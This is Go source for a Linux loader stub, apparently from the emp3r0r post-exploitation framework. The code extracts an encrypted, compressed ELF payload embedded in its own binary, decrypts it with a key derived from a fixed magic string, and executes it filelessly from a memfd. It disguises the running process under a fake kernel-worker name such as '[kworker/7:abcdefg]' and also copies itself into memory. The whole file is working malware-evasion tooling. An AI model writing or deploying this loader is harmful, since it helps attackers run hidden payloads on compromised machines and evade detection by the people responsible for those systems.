//go:build linux
// +build linux

package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/mholt/archiver"
)

func main() {
	// find embeded ELF
	encElfBytes, err := util.DigEmbeddedDataFromArg0()
	if err != nil {
		e := err
		log.Printf("DigEmbeddedDataFromArg0: %v", err)
		encElfBytes, err = util.DigEmbededDataFromMem()
		if err != nil {
			log.Fatalf("DigEmbeddedDataFromArg0: %v. DigEmbededDataFromMem: %v", e, err)
		}
	}

	// decrypt attached ELF file
	key := tun.GenAESKey(emp3r0r_data.MagicString)
	elfdata := tun.AESDecryptRaw(key, encElfBytes)
	if elfdata == nil {
		log.Fatal("AESDecrypt failed")
	}

	// decompress
	var decompressedBytes []byte
	gz := &archiver.Gz{CompressionLevel: 9}
	r := bytes.NewReader(elfdata)
	w := bytes.NewBuffer(decompressedBytes)
	err = gz.Decompress(r, w)
	if err != nil {
		log.Fatalf("Decompress ELF: %v", err)
	}

	// run from memfd
	procName := fmt.Sprintf("[kworker/%d:%s]", util.RandInt(5, 12), util.RandStr(7))
	util.MemfdExec(procName, w.Bytes())

	// write self to memfd
	self_elf_data, err := ioutil.ReadFile(os.Args[0])
	if err != nil {
		log.Printf("read self: %v", err)
	}
	fd := util.MemFDWrite(self_elf_data)
	if fd < 0 {
		log.Print("MemFDWrite failed")
	}
}
